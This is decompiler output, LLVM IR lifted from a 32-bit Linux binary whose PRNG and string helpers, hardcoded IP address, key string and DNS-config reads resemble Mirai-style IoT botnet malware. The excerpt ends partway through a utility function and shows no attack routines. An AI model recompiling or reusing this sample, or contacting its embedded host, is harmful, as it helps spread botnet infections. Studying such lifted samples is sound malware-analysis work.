source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805200c.2 = global i32 0
@global_var_8052024.3 = local_unnamed_addr global i32* @global_var_805200c.2
@global_var_805187c.4 = constant i32 0
@global_var_80522e4.5 = global i32 0
@global_var_8052010.6 = local_unnamed_addr global i32 0
@global_var_8052310.8 = local_unnamed_addr global i32 0
@global_var_8052314.9 = local_unnamed_addr global i32 0
@global_var_8052318.10 = local_unnamed_addr global i32 0
@global_var_804ff2e.11 = constant [30 x i8] c"fjh249f20348rh13rf8j13ru310rt\00"
@global_var_804ff4c.12 = constant [7 x i8] c"(null)\00"
@global_var_8052038 = external local_unnamed_addr global i32
@global_var_8050360.14 = constant i32 65536
@global_var_8052308.15 = local_unnamed_addr global i32 0
@global_var_8052300.16 = local_unnamed_addr global i32 0
@global_var_8052304.17 = local_unnamed_addr global i32 0
@global_var_8054564.18 = local_unnamed_addr global i32 0
@global_var_804ff55.20 = constant i32 4915244
@global_var_8052030.22 = local_unnamed_addr global i32 -1
@global_var_804ff20.23 = constant [14 x i8] c"66.172.10.124\00"
@global_var_805202c.24 = global [14 x i8]* @global_var_804ff20.23
@global_var_804ff59.25 = constant i32 2097199
@global_var_804ff5b.26 = constant i32 32
@global_var_8052040.27 = local_unnamed_addr global i32* @global_var_8050360.14
@global_var_8052520.28 = global i32 0
@global_var_805231c.29 = global i32 0
@global_var_8052320.30 = global i32 0
@global_var_80524ec.31 = global i32 0
@global_var_8052160.32 = global i32 0
@global_var_8054994.33 = local_unnamed_addr global i32 0
@global_var_8054988.34 = global i32 0
@global_var_8054580.35 = global i32 0
@global_var_8052044.36 = global i32 0
@global_var_805462c.38 = global i32 0
@global_var_8054630.39 = local_unnamed_addr global i32 0
@global_var_8054634.40 = global i32 0
@global_var_8054640.41 = local_unnamed_addr global i32 0
@global_var_8054934.42 = global i32 0
@global_var_805495c.43 = local_unnamed_addr global i32 0
@global_var_805494c.44 = local_unnamed_addr global i32 0
@global_var_8054950.45 = local_unnamed_addr global i32 0
@global_var_8054954.46 = local_unnamed_addr global i32 0
@global_var_8054970.47 = local_unnamed_addr global i32 0
@global_var_8054958.48 = local_unnamed_addr global i32 0
@global_var_8054964.49 = local_unnamed_addr global i32 0
@global_var_8054968.50 = local_unnamed_addr global i32 0
@global_var_8054974.51 = local_unnamed_addr global i32 0
@global_var_8054948.52 = local_unnamed_addr global i32 0
@global_var_8054944.54 = local_unnamed_addr global i32 0
@global_var_805496c.55 = local_unnamed_addr global i32 0
@global_var_805463c.56 = local_unnamed_addr global i32 0
@global_var_805205c.57 = global i32 0
@global_var_8052074.59 = global i32 0
@global_var_805208c = external global i32
@global_var_80520c4.61 = global i32 -1726662223
@global_var_8052094.62 = local_unnamed_addr global i32* @global_var_80520c4.61
@global_var_8052090.63 = global i32* @global_var_80520c4.61
@global_var_8050574.64 = constant i32 0
@global_var_8050560.65 = constant i32 0
@global_var_8052140.66 = global i32 0
@global_var_8052504.67 = local_unnamed_addr global i32 0
@global_var_8052000.69 = global i32 -1
@global_var_804b773.70 = constant i32 -294069
@global_var_8052514.71 = local_unnamed_addr global i32 0
@global_var_8052518.72 = local_unnamed_addr global i32 0
@global_var_80507e0.73 = constant [10 x i8] c"/dev/null\00"
@global_var_8052510.75 = local_unnamed_addr global i32 0
@global_var_8052508.76 = local_unnamed_addr global i32 0
@global_var_805250c.77 = local_unnamed_addr global i32 0
@global_var_8050ba5.78 = constant i32 1970153472
@global_var_8052158.79 = local_unnamed_addr global i32* @global_var_8050ba5.78
@global_var_804b95b.80 = constant i32 1928542531
@global_var_804b97f.81 = constant i32 1928542531
@global_var_8052544.82 = local_unnamed_addr global i32 0
@global_var_8052524.83 = global i32 0
@global_var_8054998.87 = local_unnamed_addr global i32 0
@global_var_80507ea.88 = constant i32 1697579054
@global_var_805081e.89 = constant i32 1868824690
@global_var_80507ec.90 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_80507fd.91 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8050815.92 = constant [11 x i8] c"nameserver\00"
@global_var_8050820.93 = constant [7 x i8] c"domain\00"
@global_var_8050827.94 = constant [7 x i8] c"search\00"
@global_var_8054978.95 = global i32 0
@global_var_805499c.96 = local_unnamed_addr global i32 0
@global_var_80549a0.97 = local_unnamed_addr global i32 0
@global_var_80521a8.98 = global i32 0
@global_var_8052548.99 = local_unnamed_addr global i32 0
@global_var_805254c.100 = local_unnamed_addr global i32 0
@global_var_80521c0.101 = local_unnamed_addr global i32 2
@global_var_8052190.102 = global i32 0
@global_var_805218c.104 = global i32* bitcast (i16* @global_var_80521e0.103 to i32*)
@global_var_8050830.106 = constant i32 0
@global_var_805085c.107 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8050859.109 = constant [3 x i8] c"%x\00"
@global_var_805086d.110 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8050878.111 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_80509a0.112 = constant i32 65536
@global_var_80522d4.113 = local_unnamed_addr global i32* @global_var_80509a0.112
@global_var_8050ba0.114 = constant [6 x i8] c"(nil)\00"
@global_var_8050ba6.115 = constant [7 x i8] c"(null)\00"
@global_var_8050bad.116 = constant i32 2949163
@global_var_8050c1a.118 = constant i32 327688
@global_var_8050c12.119 = constant [8 x i8] c" +0-#'I\00"
@global_var_8050bc0.120 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8050bfd.121 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8050bf3.122 = constant i32 117506048
@global_var_8050be4.123 = constant i32 331776
@global_var_8050c60.124 = constant [8 x i8] c"Success\00"
@global_var_8050c3e.125 = constant [15 x i8] c"Unknown error \00"
@global_var_80517cc.127 = constant [4 x i8] c"inf\00"
@global_var_80517cf.132 = constant i32 1179535616
@global_var_80517dc.133 = constant i32 2883630
@global_var_80522e0.1 = local_unnamed_addr global i8 0
@global_var_805230c.7 = local_unnamed_addr global i8 0
@1 = internal constant [2 x i8] c"S\00"
@global_var_804ff53.19 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@2 = internal constant [2 x i8] c"K\00"
@global_var_804ff57.21 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_8054600.37 = global i8 0
@global_var_8054960.53 = local_unnamed_addr global i8 0
@global_var_8052500.58 = local_unnamed_addr global i8 0
@global_var_805251c.74 = local_unnamed_addr global i8 0
@global_var_8052528.84 = external global i8*
@global_var_8052540.85 = local_unnamed_addr global i64 0
@global_var_805215c.86 = local_unnamed_addr global i16 1
@global_var_80521e0.103 = global i16 288
@global_var_8052230.105 = local_unnamed_addr global i16 272
@global_var_8050c32.117 = external constant i8*
@global_var_80517e0.130 = constant x86_fp80* null

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 40823
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80522e0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80522e0.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8052024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80522e0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805187c.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_8052010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134517777, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134545140, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @rand_init() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804818f = load i32, i32* @ebx, align 4
  store i32 %v0_804818f, i32* %stack_var_-8, align 4
  %v2_804819a = call i32 @__GI_time(i32* null)
  %v1_804819f = trunc i32 %v2_804819a to i8
  store i8 %v1_804819f, i8* @global_var_805230c.7, align 4
  %v0_80481a4 = call i32 @__libc_getpid()
  store i32 %v0_80481a4, i32* @ebx, align 4
  %v1_80481ab = call i32 @getppid(i32 0)
  %v1_80481b0 = load i32, i32* @ebx, align 4
  %v2_80481b0 = xor i32 %v1_80481b0, %v1_80481ab
  store i32 %v2_80481b0, i32* @global_var_8052310.8, align 16
  %v0_80481b7 = call i32 @clock()
  store i32 %v0_80481b7, i32* @global_var_8052314.9, align 4
  %v0_80481c7 = load i32, i32* @global_var_8052310.8, align 16
  %v2_80481cc = xor i32 %v0_80481c7, %v0_80481b7
  store i32 %v2_80481cc, i32* @global_var_8052318.10, align 8
  %v2_80481d6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80481d6, i32* @ebx, align 4
  ret i32 %v2_80481cc
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v0_80481df = load i8, i8* @global_var_805230c.7, align 1
  %v1_80481df = sext i8 %v0_80481df to i32
  %v2_80481f3 = udiv i32 %v1_80481df, 256
  %v6_80481f6 = xor i32 %v2_80481f3, %v1_80481df
  %v0_80481f9 = load i32, i32* @global_var_8052310.8, align 16
  %v1_80481fe = trunc i32 %v0_80481f9 to i8
  store i8 %v1_80481fe, i8* @global_var_805230c.7, align 4
  %v0_8048203 = load i32, i32* @global_var_8052314.9, align 4
  store i32 %v0_8048203, i32* @global_var_8052310.8, align 16
  %v0_804820d = load i32, i32* @global_var_8052318.10, align 8
  store i32 %v0_804820d, i32* @global_var_8052314.9, align 4
  %v2_804821e = udiv i32 %v0_804820d, 524288
  store i32 %v2_804821e, i32* @edx, align 4
  %sext = mul i32 %v6_80481f6, 16777216
  %v5_8048232 = sdiv i32 %sext, 16777216
  %v2_8048226 = xor i32 %v5_8048232, %v0_804820d
  %v6_8048232 = xor i32 %v2_8048226, %v2_804821e
  store i32 %v6_8048232, i32* @global_var_8052318.10, align 8
  ret i32 %v6_8048232

; uselistorder directives
  uselistorder i32 %v2_804821e, { 1, 0 }
  uselistorder i32 %v0_804820d, { 1, 0, 2 }
  uselistorder i32 %v1_80481df, { 1, 0 }
  uselistorder i8* @global_var_805230c.7, { 2, 1, 0 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp59 = icmp slt i32 %arg2, 1
  %tmp610 = icmp eq i1 %tmp59, false
  br i1 %tmp610, label %dec_label_pc_8048247, label %dec_label_pc_80482a1

dec_label_pc_8048247:                             ; preds = %entry, %dec_label_pc_804829b.backedge
  %stack_var_8.012 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_804829b.backedge ], [ %arg2, %entry ]
  %stack_var_4.011 = phi i16* [ %stack_var_4.0.be, %dec_label_pc_804829b.backedge ], [ %arg1, %entry ]
  %v7_804824b = icmp sgt i32 %stack_var_8.012, 3
  br i1 %v7_804824b, label %dec_label_pc_804824d, label %dec_label_pc_8048266

dec_label_pc_804824d:                             ; preds = %dec_label_pc_8048247
  %v4_804824d = ptrtoint i16* %stack_var_4.011 to i32
  %v0_8048250 = call i32 @rand_next()
  %v2_8048255 = bitcast i16* %stack_var_4.011 to i32*
  store i32 %v0_8048250, i32* %v2_8048255, align 4
  %v5_8048257 = add i32 %v4_804824d, 4
  %v1_804825e = add i32 %stack_var_8.012, -4
  store i32 %v1_804825e, i32* @eax, align 4
  br label %dec_label_pc_804829b.backedge

dec_label_pc_8048266:                             ; preds = %dec_label_pc_8048247
  %v7_804826a = icmp sgt i32 %stack_var_8.012, 1
  br i1 %v7_804826a, label %dec_label_pc_804826c, label %dec_label_pc_8048289

dec_label_pc_804826c:                             ; preds = %dec_label_pc_8048266
  %v4_804826c = ptrtoint i16* %stack_var_4.011 to i32
  %v0_804826f = call i32 @rand_next()
  %v1_8048277 = trunc i32 %v0_804826f to i16
  store i16 %v1_8048277, i16* %stack_var_4.011, align 2
  %v5_804827a = add i32 %v4_804826c, 2
  %v1_8048281 = add i32 %stack_var_8.012, -2
  store i32 %v1_8048281, i32* @eax, align 4
  br label %dec_label_pc_804829b.backedge

dec_label_pc_8048289:                             ; preds = %dec_label_pc_8048266
  %v5_8048266 = add i32 %stack_var_8.012, -1
  %v0_8048289 = call i32 @rand_next()
  %v4_8048290 = ptrtoint i16* %stack_var_4.011 to i32
  store i32 %v4_8048290, i32* @eax, align 4
  %v1_8048293 = trunc i32 %v0_8048289 to i8
  %v3_8048293 = bitcast i16* %stack_var_4.011 to i8*
  store i8 %v1_8048293, i8* %v3_8048293, align 1
  %v5_8048295 = add i32 %v4_8048290, 1
  br label %dec_label_pc_804829b.backedge

dec_label_pc_804829b.backedge:                    ; preds = %dec_label_pc_8048289, %dec_label_pc_804824d, %dec_label_pc_804826c
  %stack_var_4.0.be.in = phi i32 [ %v5_8048257, %dec_label_pc_804824d ], [ %v5_804827a, %dec_label_pc_804826c ], [ %v5_8048295, %dec_label_pc_8048289 ]
  %stack_var_8.0.be = phi i32 [ %v1_804825e, %dec_label_pc_804824d ], [ %v1_8048281, %dec_label_pc_804826c ], [ %v5_8048266, %dec_label_pc_8048289 ]
  %stack_var_4.0.be = inttoptr i32 %stack_var_4.0.be.in to i16*
  %tmp5 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp6 = icmp eq i1 %tmp5, false
  br i1 %tmp6, label %dec_label_pc_8048247, label %dec_label_pc_804829b.dec_label_pc_80482a1_crit_edge

dec_label_pc_804829b.dec_label_pc_80482a1_crit_edge: ; preds = %dec_label_pc_804829b.backedge
  br label %dec_label_pc_80482a1

dec_label_pc_80482a1:                             ; preds = %dec_label_pc_804829b.dec_label_pc_80482a1_crit_edge, %entry
  %v0_80482a3 = load i32, i32* @eax, align 4
  ret i32 %v0_80482a3

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i16* %stack_var_4.011, { 4, 5, 1, 3, 0, 2 }
  uselistorder i32 %stack_var_8.012, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_804829b.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048247, { 1, 0 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80482a8 = load i32, i32* @esi, align 4
  store i32 %v0_80482a8, i32* %stack_var_-12, align 4
  %tmp23 = bitcast i32* %stack_var_-54 to i8*
  store i1 false, i1* @df, align 1
  %v7_80482ba = call i8* @_memcpy(i8* %tmp23, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @global_var_804ff2e.11, i32 0, i32 0), i32 30)
  %tmp2433 = icmp slt i32 %arg2, 1
  %tmp2534 = icmp eq i1 %tmp2433, false
  br i1 %tmp2534, label %dec_label_pc_80482c1, label %dec_label_pc_8048359

dec_label_pc_80482c1:                             ; preds = %entry, %dec_label_pc_804834f.backedge
  %stack_var_4.136 = phi i8* [ %stack_var_4.1.be, %dec_label_pc_804834f.backedge ], [ %arg1, %entry ]
  %stack_var_8.035 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_804834f.backedge ], [ %arg2, %entry ]
  %tmp = icmp ult i32 %stack_var_8.035, 4
  %v0_8048311 = call i32 @rand_next()
  br i1 %tmp, label %dec_label_pc_8048311, label %dec_label_pc_80482c9

dec_label_pc_80482c9:                             ; preds = %dec_label_pc_80482c1
  br label %dec_label_pc_80482da

dec_label_pc_80482da:                             ; preds = %dec_label_pc_80482c9, %dec_label_pc_80482da
  %stack_var_-20.030.in = phi i32 [ %v0_8048311, %dec_label_pc_80482c9 ], [ %v6_80482e0, %dec_label_pc_80482da ]
  %storemerge29 = phi i32 [ 0, %dec_label_pc_80482c9 ], [ %v4_80482fb, %dec_label_pc_80482da ]
  %stack_var_4.028 = phi i8* [ %stack_var_4.136, %dec_label_pc_80482c9 ], [ %v22_80482f8, %dec_label_pc_80482da ]
  %stack_var_-20.030 = trunc i32 %stack_var_-20.030.in to i8
  %sext = mul i32 %stack_var_-20.030.in, 16777216
  %v4_80482da = sdiv i32 %sext, 16777216
  %v6_80482e0 = udiv i32 %v4_80482da, 256
  %v5_80482e4 = udiv i8 %stack_var_-20.030, 8
  %v4_80482e8 = zext i8 %v5_80482e4 to i32
  %v0_80482ec = load i32, i32* @ebp, align 4
  %v2_80482ec = add nsw i32 %v4_80482e8, -50
  %v3_80482ec = add i32 %v2_80482ec, %v0_80482ec
  %v4_80482ec = inttoptr i32 %v3_80482ec to i8*
  %v5_80482ec = load i8, i8* %v4_80482ec, align 1
  %v6_80482ec = zext i8 %v5_80482ec to i32
  %v2_80482f1 = load i32, i32* @edx, align 4
  %v3_80482f1 = and i32 %v2_80482f1, -256
  %v4_80482f1 = or i32 %v3_80482f1, %v6_80482ec
  store i32 %v4_80482f1, i32* @edx, align 4
  %v4_80482f3 = ptrtoint i8* %stack_var_4.028 to i32
  store i8 %v5_80482ec, i8* %stack_var_4.028, align 1
  %v5_80482f8 = add i32 %v4_80482f3, 1
  %v22_80482f8 = inttoptr i32 %v5_80482f8 to i8*
  %v4_80482fb = add i32 %storemerge29, 1
  %tmp38 = icmp ult i32 %v4_80482fb, 4
  br i1 %tmp38, label %dec_label_pc_80482da, label %dec_label_pc_8048306

dec_label_pc_8048306:                             ; preds = %dec_label_pc_80482da
  %v1_8048309 = add i32 %stack_var_8.035, -4
  store i32 %v1_8048309, i32* @eax, align 4
  br label %dec_label_pc_804834f.backedge

dec_label_pc_8048311:                             ; preds = %dec_label_pc_80482c1
  %v2_8048322 = zext i32 %v0_8048311 to i64
  %v4_8048322 = mul nuw i64 %v2_8048322, 2290649225
  %v2_80483263 = udiv i64 %v4_8048322, 68719476736
  %v2_804832f7 = mul nuw nsw i64 %v2_80483263, 2
  %v2_804832f = trunc i64 %v2_804832f7 to i32
  %v2_80483349 = mul nuw nsw i64 %v2_80483263, 32
  %v2_8048334 = trunc i64 %v2_80483349 to i32
  %v2_804833737 = sub i32 %v2_804832f, %v2_8048334
  %v2_804833b = add i32 %v0_8048311, %v2_804833737
  %v14_804833b = trunc i32 %v2_804833b to i8
  %v4_8048344 = ptrtoint i8* %stack_var_4.136 to i32
  store i32 %v4_8048344, i32* @eax, align 4
  store i8 %v14_804833b, i8* %stack_var_4.136, align 1
  %v5_8048349 = add i32 %v4_8048344, 1
  %v22_8048349 = inttoptr i32 %v5_8048349 to i8*
  %v4_804834c = add i32 %stack_var_8.035, -1
  br label %dec_label_pc_804834f.backedge

dec_label_pc_804834f.backedge:                    ; preds = %dec_label_pc_8048311, %dec_label_pc_8048306
  %stack_var_8.0.be = phi i32 [ %v4_804834c, %dec_label_pc_8048311 ], [ %v1_8048309, %dec_label_pc_8048306 ]
  %stack_var_4.1.be = phi i8* [ %v22_8048349, %dec_label_pc_8048311 ], [ %v22_80482f8, %dec_label_pc_8048306 ]
  %tmp24 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp25 = icmp eq i1 %tmp24, false
  br i1 %tmp25, label %dec_label_pc_80482c1, label %dec_label_pc_8048359

dec_label_pc_8048359:                             ; preds = %dec_label_pc_804834f.backedge, %entry
  %v2_804835c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804835c, i32* @esi, align 4
  %v0_804835f = load i32, i32* @eax, align 4
  ret i32 %v0_804835f

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i32 %v0_8048311, { 0, 2, 1 }
  uselistorder i32 %stack_var_8.035, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80482da, { 1, 0 }
  uselistorder label %dec_label_pc_80482c1, { 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %v0_8048360 = load i32, i32* @ebp, align 4
  %v4_80483726 = ptrtoint i8* %arg1 to i32
  %v2_80483757 = load i8, i8* %arg1, align 1
  %v4_80483788 = icmp eq i8 %v2_80483757, 0
  %v1_804837a9 = icmp eq i1 %v4_80483788, false
  %v4_804838011 = icmp eq i1 %v1_804837a9, false
  %v1_804838212 = icmp eq i1 %v4_804838011, false
  br i1 %v1_804838212, label %dec_label_pc_804836f, label %dec_label_pc_8048384

dec_label_pc_804836f:                             ; preds = %entry, %dec_label_pc_804836f
  %v4_804837214 = phi i32 [ %v5_804837d, %dec_label_pc_804836f ], [ %v4_80483726, %entry ]
  %storemerge13 = phi i32 [ %v4_804836f, %dec_label_pc_804836f ], [ 0, %entry ]
  %v5_804837d = add i32 %v4_804837214, 1
  %v22_804837d = inttoptr i32 %v5_804837d to i8*
  %v4_804836f = add i32 %storemerge13, 1
  %v2_8048375 = load i8, i8* %v22_804837d, align 1
  %v4_8048378 = icmp eq i8 %v2_8048375, 0
  %v1_804837a = icmp eq i1 %v4_8048378, false
  %v4_8048380 = icmp eq i1 %v1_804837a, false
  %v1_8048382 = icmp eq i1 %v4_8048380, false
  br i1 %v1_8048382, label %dec_label_pc_804836f, label %dec_label_pc_8048384

dec_label_pc_8048384:                             ; preds = %dec_label_pc_804836f, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804836f, %dec_label_pc_804836f ]
  store i32 %v0_8048360, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v5_804837d, { 1, 0 }
  uselistorder label %dec_label_pc_804836f, { 1, 0 }
}

define i32 @util_memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v13_80483b112 = icmp eq i32 %arg3, 0
  %v1_80483b514 = icmp eq i1 %v13_80483b112, false
  br i1 %v1_80483b514, label %dec_label_pc_804839d, label %dec_label_pc_80483b7

dec_label_pc_804839d:                             ; preds = %entry, %dec_label_pc_804839d
  %storemerge.in17 = phi i32 [ %v5_80483ab, %dec_label_pc_804839d ], [ %arg2, %entry ]
  %stack_var_12.016 = phi i32 [ %v4_80483ae, %dec_label_pc_804839d ], [ %arg3, %entry ]
  %stack_var_-12.015 = phi i8* [ %v22_80483a8, %dec_label_pc_804839d ], [ %arg1, %entry ]
  %v4_80483ae = add i32 %stack_var_12.016, -1
  %storemerge = inttoptr i32 %storemerge.in17 to i8*
  store i32 %storemerge.in17, i32* %eax.global-to-local, align 4
  %v2_80483a0 = load i8, i8* %storemerge, align 1
  %v4_80483a3 = ptrtoint i8* %stack_var_-12.015 to i32
  store i32 %v4_80483a3, i32* %eax.global-to-local, align 4
  store i8 %v2_80483a0, i8* %stack_var_-12.015, align 1
  %v5_80483a8 = add i32 %v4_80483a3, 1
  %v22_80483a8 = inttoptr i32 %v5_80483a8 to i8*
  %v5_80483ab = add i32 %storemerge.in17, 1
  %v13_80483b1 = icmp eq i32 %v4_80483ae, 0
  %v1_80483b5 = icmp eq i1 %v13_80483b1, false
  br i1 %v1_80483b5, label %dec_label_pc_804839d, label %dec_label_pc_80483ae.dec_label_pc_80483b7_crit_edge

dec_label_pc_80483ae.dec_label_pc_80483b7_crit_edge: ; preds = %dec_label_pc_804839d
  %v0_80483b8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80483b7

dec_label_pc_80483b7:                             ; preds = %dec_label_pc_80483ae.dec_label_pc_80483b7_crit_edge, %entry
  %v0_80483b8 = phi i32 [ %v0_80483b8.pre, %dec_label_pc_80483ae.dec_label_pc_80483b7_crit_edge ], [ %arg2, %entry ]
  ret i32 %v0_80483b8

; uselistorder directives
  uselistorder i32 %v4_80483ae, { 1, 0 }
  uselistorder i32 %storemerge.in17, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804839d, { 1, 0 }
}

define i32 @util_strcpy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80483b9 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b9, i32* %stack_var_-4, align 4
  %v4_80483b9 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80483b9, i32* @ebp, align 4
  %v1_80483c5 = inttoptr i32 %arg2 to i8*
  %v2_80483c5 = call i32 @util_strlen(i8* %v1_80483c5)
